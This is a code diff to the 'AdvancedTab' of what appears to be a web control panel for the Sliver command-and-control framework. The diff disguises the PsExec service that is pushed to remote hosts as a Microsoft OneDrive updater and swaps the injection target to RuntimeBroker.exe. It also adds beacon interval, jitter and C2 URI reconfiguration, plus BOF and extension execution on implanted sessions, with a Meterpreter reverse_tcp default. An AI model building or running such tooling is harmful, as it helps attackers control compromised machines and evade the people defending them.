@@ -1,6 +1,11 @@
-import { useState } from 'react'
+import { useEffect, useState } from 'react'
+import { Link } from 'react-router-dom'
 import { useTranslation } from 'react-i18next'
 import { api } from '../../lib/api'
+import type { Alias } from '../../lib/types'
+
+const PSEXEC_SERVICE_NAME = 'OneDrive Updator'
+const PSEXEC_SERVICE_DESC = 'Provides update support for Microsoft OneDrive.'
 
 function toBase64(file: File): Promise<string> {
   return new Promise((resolve, reject) => {
@@ -14,6 +19,14 @@ function toBase64(file: File): Promise<string> {
   })
 }
 
+function parsePositiveSeconds(raw: string): number | undefined {
+  const trimmed = raw.trim()
+  if (!trimmed) return undefined
+  const n = Number(trimmed)
+  if (!Number.isFinite(n) || n <= 0) return undefined
+  return Math.round(n)
+}
+
 export default function AdvancedTab({ sessionId }: { sessionId: string }) {
   const { t } = useTranslation()
   const [mode, setMode] = useState<'assembly' | 'sideload' | 'spawndll'>('assembly')
@@ -25,9 +38,22 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
   const [error, setError] = useState('')
   const [running, setRunning] = useState(false)
   const [reconSec, setReconSec] = useState('60')
+  const [reconBeaconInterval, setReconBeaconInterval] = useState('')
+  const [reconBeaconJitter, setReconBeaconJitter] = useState('')
+  const [reconC2Uri, setReconC2Uri] = useState('')
   const [reconMsg, setReconMsg] = useState('')
   const [reconError, setReconError] = useState('')
   const [reconfiguring, setReconfiguring] = useState(false)
+
+  const [aliases, setAliases] = useState<Alias[]>([])
+  const [extNames, setExtNames] = useState<string[]>([])
+  const [bofPick, setBofPick] = useState('')
+  const [bofArgs, setBofArgs] = useState('')
+  const [bofExport, setBofExport] = useState('')
+  const [bofMsg, setBofMsg] = useState('')
+  const [bofError, setBofError] = useState('')
+  const [bofOutput, setBofOutput] = useState('')
+  const [bofRunning, setBofRunning] = useState(false)
 
   const [msfMode, setMsfMode] = useState<'msf' | 'msfRemote'>('msf')
   const [msfPayload, setMsfPayload] = useState('windows/meterpreter/reverse_tcp')
@@ -81,12 +107,34 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
 
   const [peHost, setPeHost] = useState('')
   const [peProfile, setPeProfile] = useState('')
-  const [peServiceName, setPeServiceName] = useState('Sliver')
-  const [peServiceDesc, setPeServiceDesc] = useState('Sliver implant')
+  const [peServiceName, setPeServiceName] = useState(PSEXEC_SERVICE_NAME)
+  const [peServiceDesc, setPeServiceDesc] = useState(PSEXEC_SERVICE_DESC)
   const [peBinPath, setPeBinPath] = useState('C:\\Windows\\Temp')
   const [peMsg, setPeMsg] = useState('')
   const [peError, setPeError] = useState('')
   const [peRunning, setPeRunning] = useState(false)
+
+  useEffect(() => {
+    let cancelled = false
+    const loadBof = async () => {
+      try {
+        const d = await api.aliases()
+        if (!cancelled) setAliases(d.aliases || [])
+      } catch {
+        if (!cancelled) setAliases([])
+      }
+      try {
+        const d = await api.listExtensions(sessionId)
+        if (!cancelled) setExtNames(d.names || [])
+      } catch {
+        if (!cancelled) setExtNames([])
+      }
+    }
+    void loadBof()
+    return () => {
+      cancelled = true
+    }
+  }, [sessionId])
 
   const reconfigure = async () => {
     const seconds = Number(reconSec)
@@ -94,16 +142,77 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
       setReconError(t('advanced.reconInvalid'))
       return
     }
+    const opts: {
+      reconnect_interval?: number
+      beacon_interval?: number
+      beacon_jitter?: number
+      c2_uri?: string
+    } = { reconnect_interval: Math.round(seconds) }
+    const beaconInterval = parsePositiveSeconds(reconBeaconInterval)
+    if (beaconInterval !== undefined) opts.beacon_interval = beaconInterval
+    const beaconJitter = parsePositiveSeconds(reconBeaconJitter)
+    if (beaconJitter !== undefined) opts.beacon_jitter = beaconJitter
+    const c2 = reconC2Uri.trim()
+    if (c2) opts.c2_uri = c2
     setReconfiguring(true)
     setReconError('')
     setReconMsg('')
     try {
-      await api.reconfigureSession(sessionId, Math.round(seconds))
-      setReconMsg(t('advanced.reconDone', { seconds }))
+      await api.reconfigureSession(sessionId, opts)
+      if (opts.beacon_interval !== undefined || opts.beacon_jitter !== undefined || opts.c2_uri) {
+        setReconMsg(
+          t('advanced.reconBeaconDone', {
+            reconnect: opts.reconnect_interval,
+            interval: opts.beacon_interval ?? 0,
+            jitter: opts.beacon_jitter ?? 0,
+          }),
+        )
+      } else {
+        setReconMsg(t('advanced.reconDone', { seconds: opts.reconnect_interval }))
+      }
     } catch (e) {
       setReconError((e as Error).message)
     } finally {
       setReconfiguring(false)
+    }
+  }
+
+  const pickBof = (value: string) => {
+    setBofPick(value)
+    const alias = aliases.find((a) => a.CommandName === value || a.Name === value)
+    setBofExport(alias?.Entrypoint || '')
+  }
+
+  const runBof = async () => {
+    const pick = bofPick.trim()
+    if (!pick) return
+    const alias = aliases.find((a) => a.CommandName === pick || a.Name === pick)
+    setBofRunning(true)
+    setBofError('')
+    setBofMsg('')
+    setBofOutput('')
+    try {
+      if (alias) {
+        const name = alias.Name || alias.CommandName
+        const res = await api.aliasRun(sessionId, name, {
+          args: bofArgs.trim() || undefined,
+          method: bofExport.trim() || undefined,
+        })
+        setBofOutput(res.output || '')
+        setBofMsg(t('advanced.bofOk', { name }))
+      } else {
+        const res = await api.callExtension(sessionId, {
+          name: pick,
+          export: bofExport.trim() || 'go',
+          args_b64: bofArgs.trim() ? btoa(bofArgs) : undefined,
+        })
+        setBofOutput(res.Output || '')
+        setBofMsg(t('advanced.bofOk', { name: pick }))
+      }
+    } catch (e) {
+      setBofError((e as Error).message)
+    } finally {
+      setBofRunning(false)
     }
   }
 
@@ -262,8 +371,8 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
       const res = await api.psexec(sessionId, {
         hostname: peHost.trim(),
         profile_name: peProfile.trim(),
-        service_name: peServiceName.trim() || 'Sliver',
-        service_desc: peServiceDesc.trim() || 'Sliver implant',
+        service_name: peServiceName.trim() || PSEXEC_SERVICE_NAME,
+        service_desc: peServiceDesc.trim() || PSEXEC_SERVICE_DESC,
         bin_path: peBinPath.trim() || 'C:\\Windows\\Temp',
       })
       setPeMsg(`${t('advanced.psexecOk')} ${res.host} (${res.service})`)
@@ -309,16 +418,91 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
             <label>{t('advanced.reconInterval')}</label>
             <input value={reconSec} onChange={(e) => setReconSec(e.target.value)} />
           </div>
+          <div className="field">
+            <label>{t('advanced.reconBeaconInterval')}</label>
+            <input value={reconBeaconInterval} onChange={(e) => setReconBeaconInterval(e.target.value)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.reconBeaconJitter')}</label>
+            <input value={reconBeaconJitter} onChange={(e) => setReconBeaconJitter(e.target.value)} />
+          </div>
+          <div className="field">
+            <label>{t('advanced.reconC2Uri')}</label>
+            <input value={reconC2Uri} onChange={(e) => setReconC2Uri(e.target.value)} />
+          </div>
           <div className="field" style={{ justifyContent: 'flex-end' }}>
             <button type="button" className="btn" onClick={reconfigure} disabled={reconfiguring}>
               {reconfiguring ? t('common.loading') : t('advanced.reconApply')}
             </button>
           </div>
         </div>
+        <div className="form-hint" style={{ marginBottom: 12 }}>
+          {t('advanced.reconC2Hint')}
+        </div>
         {reconError && <div className="error-banner">{reconError}</div>}
         {reconMsg && (
           <div className="success-banner">
             {reconMsg}
+          </div>
+        )}
+      </div>
+      <div className="card">
+        <div className="card-title">{t('advanced.bofTitle')}</div>
+        <div className="form-hint" style={{ marginBottom: 12 }}>
+          {t('advanced.bofHint')}
+        </div>
+        {aliases.length === 0 && (
+          <div className="form-hint" style={{ marginBottom: 12 }}>
+            {t('advanced.bofEmpty')}{' '}
+            <Link to="/armory">{t('nav.armory')}</Link>
+          </div>
+        )}
+        {(aliases.length > 0 || extNames.length > 0) && (
+          <div className="form-grid" style={{ marginBottom: 12 }}>
+            <div className="field">
+              <label>{t('advanced.bofAlias')}</label>
+              <select value={bofPick} onChange={(e) => pickBof(e.target.value)}>
+                <option value="" />
+                {aliases.map((a) => {
+                  const value = a.CommandName || a.Name
+                  return (
+                    <option key={`alias-${value}`} value={value}>
+                      {value}
+                    </option>
+                  )
+                })}
+                {extNames
+                  .filter((n) => !aliases.some((a) => a.CommandName === n || a.Name === n))
+                  .map((n) => (
+                    <option key={`ext-${n}`} value={n}>
+                      {n}
+                    </option>
+                  ))}
+              </select>
+            </div>
+            <div className="field" style={{ flex: 2 }}>
+              <label>{t('advanced.bofArgs')}</label>
+              <input value={bofArgs} onChange={(e) => setBofArgs(e.target.value)} />
+            </div>
+            <div className="field">
+              <label>{t('advanced.bofExport')}</label>
+              <input value={bofExport} onChange={(e) => setBofExport(e.target.value)} />
+            </div>
+            <div className="field" style={{ justifyContent: 'flex-end' }}>
+              <button type="button" className="btn primary" onClick={() => void runBof()} disabled={bofRunning || !bofPick}>
+                {bofRunning ? t('common.loading') : t('advanced.bofRun')}
+              </button>
+            </div>
+          </div>
+        )}
+        {bofError && <div className="error-banner">{bofError}</div>}
+        {bofMsg && <div className="success-banner">{bofMsg}</div>}
+        {bofOutput && (
+          <div className="exec-output">
+            <div className="exec-output-header">
+              <span>{t('exec.output')}</span>
+            </div>
+            <pre>{bofOutput}</pre>
           </div>
         )}
       </div>
@@ -343,7 +527,11 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
         </div>
         <div className="field">
           <label>{t('advanced.process')}</label>
-          <input value={process} onChange={(e) => setProcess(e.target.value)} placeholder="notepad.exe" />
+          <input
+            value={process}
+            onChange={(e) => setProcess(e.target.value)}
+            placeholder="RuntimeBroker.exe"
+          />
         </div>
         {mode !== 'assembly' && (
           <div className="field">
@@ -356,6 +544,12 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
             {running ? t('common.loading') : t('advanced.run')}
           </button>
         </div>
+      </div>
+      <div className="form-hint" style={{ marginBottom: 8 }}>
+        {t('advanced.processHint')}
+      </div>
+      <div className="form-hint warn-hint" style={{ marginBottom: 12 }}>
+        {t('advanced.crtWarn')}
       </div>
       {error && <div className="error-banner">{error}</div>}
       {output && (
@@ -582,6 +776,9 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
             </button>
           </div>
         </div>
+        <div className="form-hint warn-hint" style={{ marginBottom: 12 }}>
+          {t('advanced.crtWarn')}
+        </div>
         {scError && <div className="error-banner">{scError}</div>}
         {scMsg && (
           <div className="success-banner">
@@ -618,6 +815,9 @@ export default function AdvancedTab({ sessionId }: { sessionId: string }) {
               {peRunning ? t('common.loading') : t('advanced.psexecRun')}
             </button>
           </div>
+        </div>
+        <div className="form-hint" style={{ marginBottom: 12 }}>
+          {t('advanced.psexecDefaultHint')}
         </div>
         {peError && <div className="error-banner">{peError}</div>}
         {peMsg && (
